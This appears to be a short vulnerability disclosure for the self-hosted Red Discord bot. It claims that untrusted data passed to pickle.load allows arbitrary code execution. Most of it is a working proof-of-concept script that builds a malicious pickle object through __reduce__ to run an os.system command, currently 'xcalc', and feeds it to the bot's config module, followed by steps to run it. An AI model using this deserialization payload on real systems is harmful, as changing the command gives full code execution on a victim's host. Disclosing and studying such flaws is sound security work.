# Description
Red is a fully modular bot – meaning all features and commands can be enabled/disabled to your liking, making it completely customizable. This is a self-hosted bot – meaning you will need to host and maintain your own instance.
* **Vulnerability description**
    untrusted loading of data by the pickle.load function leading to Arbitrary code execution.

# Proof of Concept
Run exploit.py
```python
import os
import pickle
#os.system('pip3 install Red-DiscordBot')
from redbot.core import config
#payload formation
class ArbitraryCode:
    def __reduce__(self):
        cmd = ('xcalc')
        return os.system, (cmd,)
#exploiting
dumps = pickle.dumps(ArbitraryCode())
config.defaults(dumps)
```
* `pip3 install Red-DiscordBot`
* `python3 exploit.py`
